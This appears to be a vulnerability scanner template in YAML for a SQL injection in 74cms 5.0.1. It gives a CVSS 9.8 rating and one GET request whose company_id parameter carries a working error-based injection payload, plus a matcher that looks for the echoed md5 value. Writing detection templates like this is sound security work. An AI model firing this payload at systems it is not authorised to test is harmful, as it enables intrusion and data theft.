id: 74cms-sqli
info:
  name: 74cms Sql Injection
  author: princechaddha
  severity: critical
  description: The 74cms 5.0.1 AjaxPersonalController.class.php has a SQL injection
    vulnerability known as 74cms-sqli.
  reference:
  - https://github.com/possib1e/vuln/issues/3
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
  tags: 74cms,sqli
  metadata:
    impact: The impact of the SQL injection vulnerability in 74cms 5.0.1 AjaxPersonalController.class.php
      could allow unauthorized access to sensitive data stored in the system.
    recommendation: It is recommended that immediate action be taken to patch the
      SQL injection vulnerability in 74cms 5.0.1 AjaxPersonalController.class.php.
variables:
  num: '999999999'
requests:
- method: GET
  path:
  - '{{BaseURL}}/index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=test")
    and extractvalue(1,concat(0x7e,md5({{num}}))) -- a'
  matchers:
  - type: word
    words:
    - '{{md5({{num}})}}'
    part: body
